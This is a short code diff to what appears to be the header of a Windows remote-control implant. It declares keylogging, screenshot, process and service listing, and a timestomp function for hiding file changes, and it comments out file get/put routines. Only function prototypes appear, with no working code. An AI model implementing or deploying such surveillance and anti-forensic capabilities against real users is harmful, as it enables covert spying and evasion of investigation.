@@ -10,11 +10,9 @@
 #include <iostream>
 #include <vcclr.h>
 #include <exception>
-
+#include <msclr\marshal.h>
 using namespace System;
-using namespace System::IO;
-using namespace System::Text;
-using namespace System::Runtime::InteropServices;
+
 
 
 //System utility functions
@@ -22,15 +20,12 @@ using namespace System::Runtime::InteropServices;
 int dir(String^ path);
 int cd(String^ path);
 int screenshot(String^ fname);
-int get(String^ rfile);
-int put(String^ lfile, String^ rfile);
-int timestomp(String^ file);
+//int get(String^ rfile);
+//int put(String^ lfile, String^ rfile);
+int timestomp(String^ good, String^ bad);
 LPCTSTR* winlist();
 LPCTSTR* servlist();
 LPCSTR* proclist();
 
 //Enhanced functions
 int keylog();
-
-//helper functions
-void writeBMPFile(LPTSTR pszFile, PBITMAPINFO pbi, HBITMAP hBmp, HDC hDC);
